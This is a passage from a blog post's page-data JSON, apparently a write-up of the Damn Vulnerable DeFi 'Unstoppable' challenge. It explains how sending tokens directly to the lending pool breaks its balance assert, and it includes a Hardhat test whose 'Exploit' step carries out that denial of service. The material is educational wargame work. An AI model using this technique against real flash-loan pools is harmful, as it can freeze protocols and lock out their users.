punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">UnstoppableLender private immutable pool;</code></p>\n<ul>\n<li>Assign a distribution address for the Unstoppable deployed contract.</li>\n</ul>\n<p><code class=\"language-text\">address private immutable owner;</code></p>\n<ul>\n<li>Assigns the address of msg.sender in the current contract.</li>\n</ul>\n<h3 id=\"functions-1\" style=\"position:relative;\"><a href=\"#functions-1\" aria-label=\"functions 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address poolAddress)</code></p>\n<ul>\n<li>Set up the distribution address of the UnstoppableLender contract and the current contract msg.sender address value in each state variable.</li>\n</ul>\n<p><code class=\"language-text\">function receiveTokens(address tokenAddress, uint256 amount) external</code></p>\n<ul>\n<li>We will proceed with the repayment of the loan while working on the flash loan.</li>\n<li>Compare the msg.sender address value with the contract address value because UnstoppableLender contract only calls this function.</li>\n<li>Finalize the loan repayment based on the transfer function.</li>\n</ul>\n<p><code class=\"language-text\">function executeFlashLoan(uint256 amount) external</code></p>\n<ul>\n<li>UnstoppableLendercotnract internal flashLoan functions can be call.</li>\n<li>To make a call, the address value of the msg.sender address, that is, the address value of the call contract, must be the same as the address value of msg.senderwhen deploying the RecoverUnstoppable contract.</li>\n<li>Only the owner should be able to run flashloan for this part.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The final attack objective of the target contract should disable the flash loan System, causing DOS. As a result of the contract code auditing, you can see that it is a simple flash Loan pattern.\n<code class=\"language-text\">flashLoan(uint256 borrowAmount) external nonReentrant</code> To disable a function, you must carefully analyze its dependencies, such as variables and external contracts.</p>\n<p>This function uses a number of state variables to perform an Error Handling test. You can see the state variable <code class=\"language-text\">PoolBalance</code>. Verify that the value of this variable is the same for the balance before the loan, which is the balance Before variable. If the condition fails because of the use of <code class=\"language-text\">assert(poolBalance==balanceBefore);</code> assert handle, it causes an error after exhausting gas.</p>\n<p><code class=\"language-text\">PoolBalance</code> StateVariable is used to track and trigger the balance by adding the balance to the GlobalVariable value <code class=\"language-text\">msg.sender</code> balance during the deposition to this flashLoan pool contract via the <code class=\"language-text\">depositionTokens</code> function.</p>\n<p>You can see that there is a problem with the error handling method.In the <code class=\"language-text\">depositTokens</code> function, the balance of the <code class=\"language-text\">UnstoppableLender</code> Contract is added. The balance value is stored equally in the <code class=\"language-text\">poolBalance</code> variable and is used in the flashLoan function to check the balance condition.</p>\n<h3 id=\"what-happens-if-you-force-the-transfer-function-to-add-the-balance-without-calling-the-deposittoken-function\" style=\"position:relative;\"><a href=\"#what-happens-if-you-force-the-transfer-function-to-add-the-balance-without-calling-the-deposittoken-function\" aria-label=\"what happens if you force the transfer function to add the balance without calling the deposittoken function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What happens if you force the transfer function to add the balance without calling the depositToken function?</h3>\n<p>By bypassing the logic configured in the contract, the balance value of the contract was added abnormally, so <code class=\"language-text\">assert(poolBlance == balanceBefore);</code> error handling was performed on flashLoan, which could cause a contract error to cause DOS.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>Call the transfer function without adding a contract balance through the <code class=\"language-text\">depoitToken</code> function to add a contract balance, and finally call the flashLoan function. An exception occurred successfully through testing, and DOS attack completed successfully.</p>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Unstoppable'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKENS_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> tokenFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableToken'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> UnstoppableLenderFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'UnstoppableLender'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> tokenFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> UnstoppableLenderFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span><span class=\"token function\">depositTokens</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> ReceiverContractFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ReceiverUnstoppable'</span><span class=\"token punctuation\">,</span> someUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ReceiverContractFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract<span class=\"token punctuation\">.</span><span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiverContract<span class=\"token punctuation\">.</span><span class=\"token function\">executeFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span>reverted<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>I think that the vulnerability is related to [SWC-132]Unexpected EtherBalance content in the Smart Contract Weakness Classification Registry.</p>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#quick-security-check\">Quick Security Check</a></li>\n<li><a href=\"#state-variables\">State Variables</a></li>\n<li><a href=\"#functions\">Functions</a></li>\n<li><a href=\"#state-variable\">State Variable</a></li>\n<li><a href=\"#functions-1\">Functions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability\">Vulnerability</a></p>\n<ul>\n<li><a href=\"#what-happens-if-you-force-the-transfer-function-to-add-the-balance-without-calling-the-deposittoken-function\">What happens if you force the transfer function to add the balance without calling the depositToken function?</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#solve\">Solve</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. 🚀</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"July 20, 2022","title":"Damn Vulnerable DeFi Wargame Challenge1 — Unstoppable Contract Analysis😎","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-1/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/spatial-bypass-feature/","nextSlug":"/spatial-dos/","prevSlug":"/defi-wargame-1/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}